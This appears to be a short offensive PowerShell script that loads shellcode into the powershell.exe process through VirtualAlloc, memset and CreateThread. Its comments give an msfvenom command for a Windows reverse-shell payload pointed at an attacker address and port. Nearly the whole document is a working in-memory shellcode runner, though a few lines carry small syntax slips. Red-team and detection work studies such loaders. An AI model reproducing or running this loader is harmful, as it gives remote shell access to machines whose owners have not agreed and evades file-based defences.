# This script performs a basic in-memory injection to the local process (powershell.exe)
# 1. Import the necessary API functions
# 2. Use memset and VirtualAlloc to allocate memory and fill it with shellcode
# 3. Execute the shellcode in memory as its own thread using CreateThread()
# Generate the payload using: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.66.66 LPORT=5555 -f powershell -v sc -b "\x00"
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr ldAddress, uint dwSize, uint flAllocationType, uint flProtect);;

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <shellcode-goes-here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };


